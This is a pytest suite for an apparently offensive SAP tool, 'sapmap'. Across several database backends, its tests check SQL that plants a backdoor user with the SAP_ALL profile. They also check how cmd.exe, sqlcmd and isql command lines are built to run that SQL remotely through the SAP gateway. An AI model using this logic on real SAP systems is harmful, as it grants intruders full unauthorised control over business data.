#!/usr/bin/env python3
"""Tests for sapmap_config.py — username generation, DB normalization, SQL templates."""

import sys
import os
import pytest

sys.path.insert(0, os.path.join(os.path.dirname(__file__), ".."))

from sapmap_config import (
    sapmap_username,
    normalize_db_type,
    sql_hana,
    sql_mssql_abap,
    sql_maxdb,
    sql_oracle,
    sql_db2,
    sql_sybase,
    SQL_GENERATORS,
    BCODE_HEX,
    PASSCODE_HEX,
)
from sapmap_exploit import _cmd_caret_escape, _mssql_write_and_exec_win


# ---------------------------------------------------------------------------
# sapmap_username
# ---------------------------------------------------------------------------

def test_sapmap_username_0():
    assert sapmap_username(0) == "SAPMAP00"


def test_sapmap_username_1():
    assert sapmap_username(1) == "SAPMAP01"


def test_sapmap_username_99():
    assert sapmap_username(99) == "SAPMAP99"


# ---------------------------------------------------------------------------
# normalize_db_type
# ---------------------------------------------------------------------------

def test_normalize_db_type():
    # "HANA" and "HDB" are both direct keys in SQL_GENERATORS, returned as-is
    assert normalize_db_type("HANA") == "HANA"
    assert normalize_db_type("HDB") == "HDB"
    # "ADABAS D" is not a direct key — substring match normalizes to "ADA"
    assert normalize_db_type("ADABAS D") == "ADA"
    # "MAXDB" is a direct key in SQL_GENERATORS
    assert normalize_db_type("MAXDB") == "MAXDB"
    # Direct keys returned as-is
    assert normalize_db_type("MSS") == "MSS"
    assert normalize_db_type("ORACLE") == "ORACLE"
    # Sybase (issue #26) — direct key returned as-is, aliases normalise to SYB.
    # RFCSI_ANON typically reports the raw kernel string "Sybase ASE", so the
    # substring-match branch is the one that matters most in production.
    assert normalize_db_type("SYB") == "SYB"
    assert normalize_db_type("SYBASE") == "SYBASE"
    assert normalize_db_type("Sybase ASE") == "SYB"
    assert normalize_db_type("Sybase ASE 16.0") == "SYB"


# ---------------------------------------------------------------------------
# SQL generators
# ---------------------------------------------------------------------------

def test_sql_hana_contains_mandt():
    stmts = sql_hana("S4H", "000", "SAPMAP00")
    joined = " ".join(stmts)
    assert "'000'" in joined


def test_sql_hana_contains_username():
    stmts = sql_hana("S4H", "000", "SAPMAP00")
    joined = " ".join(stmts)
    assert "'SAPMAP00'" in joined


def test_sql_mssql_has_go():
    stmts = sql_mssql_abap("S4H", "000", "SAPMAP00")
    assert "GO" in stmts


def test_sql_mssql_schema_is_lowercase():
    """Schema qualifier must be lowercase — SAP MSSQL uses case-sensitive collation.

    The dbs/mss/schema profile parameter is lowercase (e.g. 'twt').
    Using uppercase (TWT.USR02) causes 'Invalid object name' errors.
    The USE / -d database name stays uppercase (TWT) since it may be stored
    uppercase and the schema name is the sensitive part.
    """
    stmts = sql_mssql_abap("TWT", "000", "SAPMAP00")
    body = " ".join(stmts)
    # Schema prefix must be lowercase
    assert "twt.USR02" in body, "Schema prefix must be lowercase (twt.USR02)"
    assert "TWT.USR02" not in body, "Uppercase schema TWT.USR02 must not appear"
    # USE statement uses uppercase database name
    assert "USE TWT" in body, "USE statement must reference uppercase database name"


def test_sql_generators_return_list():
    generators = [
        (sql_hana, ("S4H", "000", "SAPMAP00")),
        (sql_mssql_abap, ("S4H", "000", "SAPMAP00")),
        (sql_maxdb, ("S4H", "000", "SAPMAP00")),
        (sql_oracle, ("S4H", "000", "SAPMAP00")),
        (sql_db2, ("S4H", "000", "SAPMAP00")),
        (sql_sybase, ("NPL", "001", "SAPMAP00")),
    ]
    for gen_fn, args in generators:
        result = gen_fn(*args)
        assert isinstance(result, list), f"{gen_fn.__name__} should return a list"
        assert len(result) > 0, f"{gen_fn.__name__} should return non-empty list"
        for item in result:
            assert isinstance(item, str), f"{gen_fn.__name__} items should be strings"


# ---------------------------------------------------------------------------
# sql_oracle — schema parameter
# ---------------------------------------------------------------------------

def test_sql_oracle_default_schema_sapsr3():
    """Default schema is SAPSR3 (ECC 6.x+)."""
    stmts = sql_oracle("ORA", "000", "SAPMAP00")
    body = " ".join(stmts)
    assert "SAPSR3." in body
    assert "SAPR3." not in body


def test_sql_oracle_explicit_schema_sapr3():
    """Explicit schema=SAPR3 uses SAPR3 (R/3 4.x/5.x)."""
    stmts = sql_oracle("ORA", "000", "SAPMAP00", schema="SAPR3")
    body = " ".join(stmts)
    assert "SAPR3." in body
    assert "SAPSR3." not in body


def test_sql_oracle_connect_no_semicolon():
    """CONNECT line must NOT end with a semicolon.

    SQL*Plus treats CONNECT as a command, not SQL.  A trailing semicolon
    causes SP2-0306 (Invalid option).
    """
    stmts = sql_oracle("ORA", "000", "SAPMAP00")
    connect_lines = [s for s in stmts if s.strip().upper().startswith("CONNECT")]
    assert connect_lines, "sql_oracle must include a CONNECT statement"
    for line in connect_lines:
        assert not line.rstrip().endswith(";"), (
            f"CONNECT line must not end with ';': {line!r}")


def test_sql_oracle_contains_usr02_insert():
    """Must insert into USR02 — the core authentication table."""
    stmts = sql_oracle("ORA", "000", "SAPMAP00")
    body = " ".join(stmts)
    assert "USR02" in body
    assert "INSERT" in body.upper()


def test_sql_oracle_contains_commit():
    """Statements must include COMMIT so changes are not rolled back."""
    stmts = sql_oracle("ORA", "000", "SAPMAP00")
    body = " ".join(stmts).upper()
    assert "COMMIT" in body


def test_sql_oracle_has_gltgb():
    """USR02 INSERT must set GLTGB='99991231' (valid-to date).

    Old kernels (700-era) treat a missing or zero GLTGB as an expired account,
    causing RFC_LOGON_FAILURE even when BCODE/PASSCODE are correct.
    """
    stmts = sql_oracle("ORA", "000", "SAPMAP00")
    usr02_inserts = [s for s in stmts if "USR02" in s.upper() and "INSERT" in s.upper()]
    assert usr02_inserts, "Must have at least one USR02 INSERT"
    for stmt in usr02_inserts:
        assert "99991231" in stmt, f"USR02 INSERT missing GLTGB='99991231': {stmt[:80]}"


def test_sql_oracle_codvn_b_has_no_passcode():
    """CODVN=B variant must NOT include a PASSCODE UPDATE.

    CODVN=B (DES, first 8 uppercase chars) is the universal fallback for
    kernel 700-era systems that predate CODVN=G (requires SAP Note 1467771).
    BCODE is sufficient — no PASSCODE field exists/is checked.
    """
    stmts = sql_oracle("ORA", "000", "SAPMAP00", codvn="B")
    body = " ".join(stmts).upper()
    assert "PASSCODE" not in body, "CODVN=B must not include PASSCODE"
    assert "BCODE" in body, "CODVN=B must still include BCODE"
    # CODVN column must be 'B' in the INSERT
    assert "'B'" in " ".join(stmts), "USR02 INSERT must use CODVN='B'"


def test_sql_oracle_codvn_g_has_passcode():
    """CODVN=G variant must include the PASSCODE UPDATE."""
    stmts = sql_oracle("ORA", "000", "SAPMAP00", codvn="G")
    body = " ".join(stmts).upper()
    assert "PASSCODE" in body, "CODVN=G must include PASSCODE"


def test_sql_oracle_codvn_default_is_g():
    """Default CODVN (no argument) must behave the same as codvn='G'."""
    stmts_default = sql_oracle("ORA", "000", "SAPMAP00")
    stmts_g       = sql_oracle("ORA", "000", "SAPMAP00", codvn="G")
    assert stmts_default == stmts_g


# ---------------------------------------------------------------------------
# _cmd_caret_escape — cmd.exe metacharacter escaping
# ---------------------------------------------------------------------------

def test_caret_escape_plain_text():
    """Text without metacharacters is returned unchanged."""
    assert _cmd_caret_escape("hello world") == "hello world"


def test_caret_escape_parentheses():
    assert _cmd_caret_escape("func(arg)") == "func^(arg^)"


def test_caret_escape_ampersand():
    assert _cmd_caret_escape("a&b") == "a^&b"


def test_caret_escape_caret_itself():
    assert _cmd_caret_escape("a^b") == "a^^b"


def test_caret_escape_pipe():
    assert _cmd_caret_escape("a|b") == "a^|b"


def test_caret_escape_angle_brackets():
    assert _cmd_caret_escape("a<b>c") == "a^<b^>c"


def test_caret_escape_semicolon_unchanged():
    """Semicolons are NOT special in cmd.exe and must NOT be escaped."""
    assert _cmd_caret_escape("INSERT INTO t;COMMIT;") == "INSERT INTO t;COMMIT;"


def test_caret_escape_slash_unchanged():
    """Forward-slash is not special in cmd.exe."""
    assert _cmd_caret_escape("/NOLOG") == "/NOLOG"


def test_caret_escape_connect_line():
    """The Oracle CONNECT line used in the exploit must escape cleanly."""
    result = _cmd_caret_escape("connect / as sysdba")
    # No metacharacters in this string — should be unchanged
    assert result == "connect / as sysdba"


def test_caret_escape_sql_with_parens():
    """SQL with parentheses (VALUES(...)) must have parens escaped."""
    sql = "INSERT INTO USR02 (MANDT,BNAME) VALUES ('000','SAPMAP00')"
    escaped = _cmd_caret_escape(sql)
    assert "^(" in escaped
    assert "^)" in escaped
    # Apostrophes and commas must not be touched
    assert "'000'" in escaped


# ---------------------------------------------------------------------------
# _mssql_write_and_exec_win — PARAMS length guard
#
# The key regression: the PASSCODE UPDATE is ~134 bytes as a command line,
# which exceeds the 128-byte EXTPROG limit of the old per-statement approach.
# The file-based function must keep each echo PARAMS under 255 bytes.
# ---------------------------------------------------------------------------

def _get_mssql_echo_params(sid, inst, sql_stmts):
    """Collect the (ext_cmd, ext_params) pairs that _mssql_write_and_exec_win
    would send, without actually opening a socket.

    Mirrors the current _mssql_write_and_exec_win implementation:
    - SQL file written to %TEMP%\\sapmap_mss.sql (expanded by cmd.exe at runtime)
    - sqlcmd executed via cmd.exe /C so %TEMP% is also expanded for -i
    - SQL Server instance: .\\<SID>_DB (SAP MSSQL named-instance convention)
    """
    from sapmap_exploit import _cmd_caret_escape
    sql_file_env = "%TEMP%\\sapmap_mss.sql"
    mssql_server = f".\\{sid.upper()}_DB"
    cmds = []
    first = True
    for sql in sql_stmts:
        stripped = sql.strip()
        if not stripped:
            continue
        esc = _cmd_caret_escape(stripped)
        redirect = f"> {sql_file_env}" if first else f">> {sql_file_env}"
        params = f"/C echo {esc} {redirect}"
        first = False
        cmds.append(("cmd.exe", params))
    cmds.append(("cmd.exe",
                 f"/C sqlcmd -S {mssql_server} -d {sid.upper()} -i {sql_file_env}"))
    return cmds


def test_mssql_passcode_update_fits_in_params():
    """PASSCODE UPDATE must fit in PARAMS (≤255 bytes).

    Root cause of the TWT failure: the old approach put
        sqlcmd -S localhost -Q "UPDATE TWT.USR02 SET PASSCODE=0x<40hex>..."
    into EXTPROG (128 B max).  That statement is ~134 bytes → SAPXPG truncates
    it → sqlcmd gets malformed SQL → 'SAPXPG command failed'.

    The file-based approach puts only "cmd.exe" in EXTPROG (7 bytes) and the
    echo/sqlcmd command in PARAMS (255 bytes max).  Verify every step fits.
    All steps use EXTPROG="cmd.exe" (7 bytes): echo steps write to %TEMP%,
    the final step runs sqlcmd -S .\\<SID>_DB via cmd.exe /C.
    """
    from sapmap_config import sql_mssql_abap, BCODE_HEX, PASSCODE_HEX
    sid, client, username = "TWT", "000", "SAPMAP00"
    stmts = [s for s in sql_mssql_abap(sid, client, username)
             if not s.strip().upper().startswith("DELETE")]
    cmds = _get_mssql_echo_params(sid, "01", stmts)
    for ext_cmd, ext_params in cmds:
        assert len(ext_cmd)    <= 128, f"EXTPROG too long: {ext_cmd!r}"
        assert len(ext_params) <= 255, (
            f"PARAMS too long ({len(ext_params)} bytes): {ext_params[:80]!r}")


def test_mssql_passcode_old_approach_would_overflow():
    """Confirm that the OLD per-statement approach DID overflow EXTPROG.

    This is a regression test — it documents the original bug: building
    'sqlcmd -S localhost -Q "<sql>"' as the EXTPROG string for the PASSCODE
    UPDATE produces a string > 128 bytes.
    """
    from sapmap_config import PASSCODE_HEX
    sid, client, username = "TWT", "000", "SAPMAP00"
    passcode_sql = (f"UPDATE {sid}.USR02 SET PASSCODE=0x{PASSCODE_HEX} "
                    f"WHERE MANDT='{client}' AND BNAME='{username}'")
    old_extprog = f"sqlcmd -S localhost -Q \"{passcode_sql}\""
    assert len(old_extprog) > 128, (
        f"Expected old approach to overflow 128 bytes, got {len(old_extprog)}")


def test_mssql_file_includes_go_separators():
    """GO batch separators from sql_mssql_abap must survive into the echo commands."""
    from sapmap_config import sql_mssql_abap
    sid, client, username = "TWT", "000", "SAPMAP00"
    stmts = [s for s in sql_mssql_abap(sid, client, username)
             if not s.strip().upper().startswith("DELETE")]
    cmds = _get_mssql_echo_params(sid, "01", stmts)
    # At least one echo command should write "GO" to the file
    go_echoes = [p for _, p in cmds if "echo GO" in p]
    assert go_echoes, "GO batch separators must be written to the SQL file"


# ---------------------------------------------------------------------------
# sql_sybase — Sybase ASE for SAP (issue #26)
#
# Sybase-specific traits the generator must honour:
#   * Schema-qualified table names (SAPSR3.USR02) — the isql session logs in
#     as sapsa which is not the SAP schema owner.
#   * BINARY / VARBINARY literals use Sybase's 0x<hex> form (no quotes, no
#     'x' prefix) — MaxDB's x'…' and HANA's '…' both fail on ASE.
#   * The generator itself returns bare SQL; the writer inserts the "go"
#     batch terminator between statements when emitting the isql file.
# ---------------------------------------------------------------------------

def test_sql_sybase_in_generators_registry():
    """SYB must appear as a first-class entry in SQL_GENERATORS so that
    _execute_sql_via_gateway's caller no longer rejects Sybase nodes with
    'Unsupported database type: SYB' (the original bug in issue #26)."""
    assert "SYB" in SQL_GENERATORS
    assert SQL_GENERATORS["SYB"] is sql_sybase


def test_sql_sybase_contains_mandt_and_username():
    stmts = sql_sybase("NPL", "001", "SAPMAP00")
    body = " ".join(stmts)
    assert "'001'" in body
    assert "'SAPMAP00'" in body


def test_sql_sybase_tables_are_schema_qualified():
    """Every table reference must carry the schema prefix — the sapsa login
    used by isql does NOT default to the SAP schema, so unqualified names
    resolve against sapsa's own (empty) schema and the INSERTs miss."""
    stmts = sql_sybase("NPL", "001", "SAPMAP00", schema="SAPSR3")
    for stmt in stmts:
        for table in ("USR02", "USR04", "UST04", "USREFUS", "USRBF2"):
            if table in stmt:
                assert f"SAPSR3.{table}" in stmt, (
                    f"Sybase SQL must schema-qualify {table}: {stmt}")


def test_sql_sybase_custom_schema():
    """Callers can override the schema for landscapes that use SAPR3
    or SAP<SID>."""
    stmts = sql_sybase("NPL", "001", "SAPMAP00", schema="SAPNPL")
    body = " ".join(stmts)
    assert "SAPNPL.USR02" in body
    assert "SAPSR3." not in body


def test_sql_sybase_binary_literals_use_0x_form():
    """BCODE and PASSCODE must be written as Sybase 0x-hex literals,
    NOT as MaxDB's x'…' or HANA's plain string form."""
    stmts = sql_sybase("NPL", "001", "SAPMAP00")
    body = " ".join(stmts)
    # BCODE INSERT and PASSCODE UPDATE both present.
    bcode_stmts = [s for s in stmts if "BCODE" in s and "INSERT" in s.upper()]
    pass_stmts  = [s for s in stmts if "PASSCODE" in s and "UPDATE" in s.upper()]
    assert bcode_stmts, "must INSERT a BCODE row"
    assert pass_stmts,  "must UPDATE PASSCODE row"
    assert f"0x{BCODE_HEX}"    in body
    assert f"0x{PASSCODE_HEX}" in body
    # And explicitly NOT the other-DB spellings.
    assert f"x'{BCODE_HEX}'"   not in body, "MaxDB-style x'…' must not appear"
    assert f"'{BCODE_HEX}'"    not in body, "HANA-style '…' must not appear"


def test_sql_sybase_includes_sap_all_row():
    """SAP_ALL profile assignment is the whole point of the exploit —
    must be present, in the same tables as the other backends."""
    stmts = sql_sybase("NPL", "001", "SAPMAP00")
    body = " ".join(stmts)
    assert "SAP_ALL" in body
    assert "UST04" in body
    assert "USR04" in body


def test_sql_sybase_has_no_go_separators_in_generator():
    """The `go` batch terminator is Sybase's, but it is inserted by the
    writer, not the generator (the generator's contract stays identical to
    the other backends: bare SQL, one statement per list entry)."""
    stmts = sql_sybase("NPL", "001", "SAPMAP00")
    for s in stmts:
        assert s.strip().lower() != "go", (
            f"generator must not emit standalone 'go' entries: {s!r}")


# ---------------------------------------------------------------------------
# Sybase writer — isql batch assembly (issue #26)
# ---------------------------------------------------------------------------

def test_sybase_isql_batch_inserts_go_between_statements():
    """_build_sybase_isql_batch must:
       - start with `use <SID>` + `go` so the sapsa session lands on the
         SAP application database (whose name is the SID by convention).
       - separate every statement with a `go` batch terminator.
       - not emit consecutive `go go` when a caller pre-inserted one."""
    from sap_db_sql_writers import _build_sybase_isql_batch
    batch = _build_sybase_isql_batch("NPL", [
        "SELECT 1",
        "GO",                # caller-inserted, must be de-duplicated
        "SELECT 2",
    ]).decode("utf-8")
    lines = [ln.strip() for ln in batch.splitlines() if ln.strip()]
    assert lines[0] == "use NPL"
    assert lines[1] == "go"
    assert "SELECT 1" in lines
    assert "SELECT 2" in lines
    # No two `go` in a row.
    for i in range(len(lines) - 1):
        assert not (lines[i] == "go" and lines[i + 1] == "go"), (
            f"unexpected consecutive 'go' at lines[{i}]")


def test_sybase_wrapper_locates_isql_across_ocs_versions():
    """The wrapper must not hard-code a single OCS version — SAP-on-Sybase
    ships /sybase/<SID>/OCS-15_7 through OCS-16_0 depending on kernel age,
    and the writer needs to work on all of them without a code change."""
    from sap_db_sql_writers import _build_sybase_wrapper_script
    script = _build_sybase_wrapper_script("NPL", db_password="")
    # Glob for any OCS-* version, not a specific one.
    assert "/sybase/*/OCS-*/bin/isql" in script
    # sapsa auth with -X encryption, batch mode.
    assert "-Usapsa" in script
    assert "-X" in script
    # SID surfaces as -S<SID>.
    assert '-S"$SID"' in script or '-SNPL' in script
    # SYBASE env must be set from the isql path so libtcl_r.cfg resolves.
    assert "export SYBASE" in script


def test_sybase_wrapper_embeds_password_safely():
    """Password with a single quote must not break out of the shell literal
    (real-world SAP-generated passwords can contain any printable char)."""
    from sap_db_sql_writers import _build_sybase_wrapper_script
    script = _build_sybase_wrapper_script("NPL", db_password="ab'cd")
    # The escaped form is the shell-single-quoted-with-inner-escape pattern.
    assert "'ab'\\''cd'" in script


def test_sybase_dispatcher_extracts_client_from_sql(monkeypatch):
    """The dispatcher must extract the MANDT from the first-seen '<3-digit>'
    VALUES-clause literal so R3trans's session client matches the SQL —
    a fixed '001' would be wrong for landscapes that use '100' or '200'."""
    import sap_db_sql_writers as w
    captured = {}

    def fake_writer(host, gw_port, instance_str, hostname, sid, kernel,
                    stmts, saprouter="", db_password="", python3_path="/usr/bin/python3",
                    client="001"):
        captured["client"] = client
        return True

    monkeypatch.setattr(w, "_sybase_write_and_exec", fake_writer)
    stmts = [
        "DELETE FROM SAPSR3.USR02 WHERE MANDT='200' AND BNAME='X'",
        "INSERT INTO SAPSR3.USR02 (MANDT,BNAME) VALUES ('200','X')",
    ]
    w._execute_sql_via_gateway("10.0.0.1", 3300, "NPL", "h", stmts,
                                db_type="SYB", os_type="linux")
    assert captured["client"] == "200"
